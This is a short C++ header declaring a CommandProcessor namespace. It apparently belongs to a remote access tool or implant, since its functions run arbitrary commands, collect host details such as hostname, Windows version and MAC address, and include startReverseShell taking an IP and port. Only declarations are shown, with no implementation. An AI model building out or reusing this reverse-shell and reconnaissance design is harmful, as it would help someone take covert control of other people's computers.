
#ifndef COMMANDPROCESSOR_HPP
#define COMMANDPROCESSOR_HPP

#include "nlohmann/json.hpp"
#include <string>

namespace CommandProcessor {
	// Function declarations
	std::string executeCommand(const std::string& command);
	std::string getSystemInfoSummary();
	std::string getHostName();
	std::string getWindowsVersion();
	std::string getWindowsVersionNumber();
	std::string getMacAddress();
	bool startReverseShell(const std::string& ip, const int port);
}

#endif // COMMANDPROCESSOR_HPP